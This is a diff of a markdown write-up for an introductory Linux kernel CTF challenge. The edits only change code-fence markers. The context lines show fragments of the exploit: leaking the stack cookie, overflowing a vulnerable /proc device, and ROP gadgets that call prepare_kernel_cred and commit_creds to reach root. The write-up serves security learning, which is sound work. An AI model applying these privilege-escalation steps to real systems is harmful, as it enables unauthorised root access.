@@ -20,7 +20,7 @@ This writeup will cover my first foray into linux kernel exploitation. Disclaime
 Since the CTF was held and aimed for beginner-intermediate players, it is a safe assumption that this is an easy and introductory kernel pwn challenge. We are given the remote server details + challenge files in `easy_kernel.tar.gz`
 
 #### Challenge + Environment Files
-```shell=
+```shell
 testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ ls -la
 total 22236
 drwxrwxr-x  3 testpwn testpwn     4096 Nov 17 20:44 .
@@ -45,7 +45,7 @@ we were given a bunch of files which help setup the kernel environment, this inc
 
 First off, we need to extract the kernel ELF from `bzImage` using a script:  [extract_image.sh](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/extract-image.sh). This step is needed since we want to get some ROP gadgets that we can use later (and it takes a long time since the kernel is large, so getting ROP gadgets early will save us some time in the long run) 
 
-```shell=
+```shell
 testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ ./extract-image.sh bzImage > vmlinux
 testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ file vmlinux 
 vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=a7baef9a18852fb290e6ad9d6fccedb84716690d, stripped
@@ -54,7 +54,7 @@ testpwn@testpwn-VirtualBox:~/Desktop/kernelarmy/pwn-kernel-extract$ ROPgadget --
 The other `.sh` files are some bash scripts which automate some stuff such as taking a look how the  pow is calculated, starting the QEMU emulator and rebuilding/compressing the file system. 
 
 #### rebuild_fs.sh
-```bash=
+```bash
 #!/bin/bash
 
 pushd fs
@@ -65,7 +65,7 @@ popd
 
 #### QEMU config
 
-```bash=
+```bash
 #!/bin/bash
 
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
@@ -106,7 +106,7 @@ Kernel debugging is painful (at least for me who is just getting started with it
 
 I also commented out a line on the `fs/init` file, basically allowing us to run the kernel as root.
 
-```bash=
+```bash
 #!/bin/sh
 
 mount -t proc none /proc
@@ -133,7 +133,7 @@ Like what we would normally do with an ELF binary, we can begin by analyzing the
 
 `init_func` and `exit_func` can be seen as the entry and exit points for the module, respectively. 
 
-```c=
+```c
 int init_func(void)
 
 {
@@ -155,7 +155,7 @@ void exit_func(void)
 
 `init_func` registers a device file named `/proc/pwn_device` and we will be interacting with this to exploit the module. 
 
-```c=
+```c
 int sopen(inode *inode,file *file)
 
 {
@@ -166,7 +166,7 @@ int sopen(inode *inode,file *file)
 
 `sopen` simply prints the string "Device opened" when we successfuly open the device file. 
 
-```c=
+```c
 ulong sread(undefined8 param_1,ulong userspace_buffer,ulong bytes_to_read)
 
 {
@@ -208,7 +208,7 @@ An important thing to note is that not only do we control the buffer address but
 
 This is what the stack looks like before the call to `copy_user_generic_unrolled`, we can see the welcome string, some kernel address offsets and the kernel stack cookie. We will be retrieving these values later on.
 
-```c=
+```c
 long sioctl(file *file,uint cmd,ulong arg)
 
 {
@@ -230,7 +230,7 @@ long sioctl(file *file,uint cmd,ulong arg)
 
 `sioctl` allows us to change the value of the `MaxBuffer` variable when we provide a cmd value of 0x20. This seems really suspicious. 
 
-```c=
+```c
 ulong swrite(undefined8 param_1,ulong userspace_buffer,ulong bytes_to_copy)
 
 {
@@ -267,7 +267,7 @@ Now here is the juicy part, it copies data from userspace and stores it into ker
 
 First off, I reused some template code which helps preserve the state of some registers. This will be useful later for when we want to return from kernel-space back to userland. 
 
-```c=
+```c
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
@@ -294,7 +294,7 @@ void save_state(){
 
 Next, we open a handle to `/proc/pwn_device` then proceed to read from it.
 
-```c=
+```c
 void main() {
 
 	save_state();
@@ -319,7 +319,7 @@ we successfully read 256 bytes from the device, all which include important kern
 #### Triggering kernel panic
 
 Currently, here is what our current exploit looks like:
-```c=
+```c
 void main() {
 
 	save_state();
@@ -359,7 +359,7 @@ When disassembling the `swrite` function, we can see that it loads the cookie in
 
 In theory, we can start overwriting the cookie at stack offset 16 (0x80/8). To test the idea, I wrote the following code:
 
-```c=
+```c
 	// Stage 2: Try to trigger kernel panic
 	int offset = 16;
 	unsigned long payload[16];
@@ -379,7 +379,7 @@ We seem to be correct. Notice that what follows after the cookie is some value (
 
 I made a small adjustment to my payload, which just preserves the kernel stack cookie, the value next to it with a dummy, then overwriting the return address:
 
-```c=
+```c
     // Stage 2: Try to trigger kernel panic
 	int offset = 16;
 	unsigned long payload[50];
@@ -400,7 +400,7 @@ Now that we can control the kernel instruction pointer, our next phase should be
 Unlike userland exploits in which our target is to spawn a shell, the goal for kernel exploits is different: to escalate the privileges of the running process (the exploit) from some basic user to root, then spawn a root shell. To do this, we take advantage of the `task_struct` structure:
 
 [include/linux/sched.h](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L1039)
-```c=
+```c
 struct task_struct {
     
     ...
@@ -421,7 +421,7 @@ The kernel tracks the privileges + other additional data of every running proces
 
 [/include/linux/cred.h](https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110)
 
-```c=
+```c
 struct cred {
 	atomic_t	usage;
 #ifdef CONFIG_DEBUG_CREDENTIALS
@@ -461,7 +461,7 @@ The next step of our payload will be to construct a rop chain that basically cal
 
 For this part, I mostly relied on writeups to know which gadgets to use. Initially my exploit code looked like this:
 
-```c=
+```c
 // gadgets
 	unsigned long pop_rdi = kernel_base + 0x1518; // pop rdi ; ret
 	unsigned long pop_rdx = kernel_base + 0x34b72; // pop rdx ; ret
@@ -505,7 +505,7 @@ For this part, I mostly relied on writeups to know which gadgets to use. Initial
 
 The idea was that after calling `prepare_kernel_cred(0)`, the resulting `cred` struct will be moved to `rax`. We need a way to move it from `rax` into `rdi`, passing it as an argument to `commit_creds`. But there is no exact ROP gadget to do just that. Instead we did the following:
 
-```clike=
+```clike
 push 0x8;
 pop rdx; // moves 8 into rdx
 cmp rdx, 8 ; 
@@ -534,7 +534,7 @@ Our kpti_trampoline resides in the function `swapgs_restore_regs_and_return_to_u
 ![](https://i.imgur.com/ChnilVi.png)
 
 #### Final Payload
-```c=
+```c
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
